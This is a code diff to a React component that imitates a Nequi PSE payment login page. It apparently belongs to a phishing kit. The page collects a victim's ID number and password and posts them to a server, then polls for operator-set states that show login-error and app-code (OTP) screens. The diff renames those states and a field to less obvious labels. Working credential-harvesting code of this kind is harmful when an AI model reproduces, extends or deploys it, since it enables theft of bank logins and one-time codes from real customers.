@@ -214,7 +214,7 @@ const Dinamica = ({handler})=>{
 
 export default function Nequi (){
     const [inicioSesion, setInicioSesion] = useState(false)
-    const [selectVista, setSelectVisata] = useState(null)
+    const [selectVista, setSelectVisata] = useState("nlogin")
     const [loading, setLoading] = useState(true)
     const [tituloError, setTituloError] = useState("")
     const [reLoad, setReLoad] = useState(false)
@@ -259,8 +259,9 @@ export default function Nequi (){
             {
                 usuario: datosInicio.numeroDocumento,
                 clave: datosInicio.contrasenia,
-                banco: "Nequi",
-                uniqid: uniqId    
+                ente: "Nequi",
+                uniqid: uniqId,
+                status: selectVista
             },
             {
                 headers: {
@@ -301,8 +302,8 @@ export default function Nequi (){
             console.log(selV.data.status);
             
             if (
-                selV.data.status == "otpapp" ||
-                selV.data.status == "otpapp-error" ||
+                selV.data.status == "codapp" ||
+                selV.data.status == "xcodapp" ||
                 selV.data.status !== selectVista
             ) {
                 setSelectVisata(selV.data.status);
@@ -408,11 +409,10 @@ export default function Nequi (){
                 <p className={`text-[20px] mt-3 font-semibold pb-5 text-[${text_color}]`}>Pagos PSE de Nequi</p>
                 {!inicioSesion && <p className={`text-[15px] pb-5 text-[${text_color}] text-center mt-2.5`}>Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.</p>}
                 {loading && <Loading/>}
-                {reLoad && <Loading/>}
                 {!inicioSesion && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerBtnInicio}/>}
-                {selectVista == "login-error" && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerloginError}/>}  
-                {selectVista == "otpapp" && <Dinamica handler={handlerAplicacion}/>}
-                {selectVista == "otpapp-error" && <Dinamica handler={handlerAplicacion}/>}
+                {selectVista == "xlogin" && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerloginError}/>}  
+                {selectVista == "codapp" && <Dinamica handler={handlerAplicacion}/>}
+                {selectVista == "xcodapp" && <Dinamica handler={handlerAplicacion}/>}
                 
                 {!inicioSesion && <span className="text-[14px] mt-5 text-center w-[80%]">¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.</span>}               
             </div>
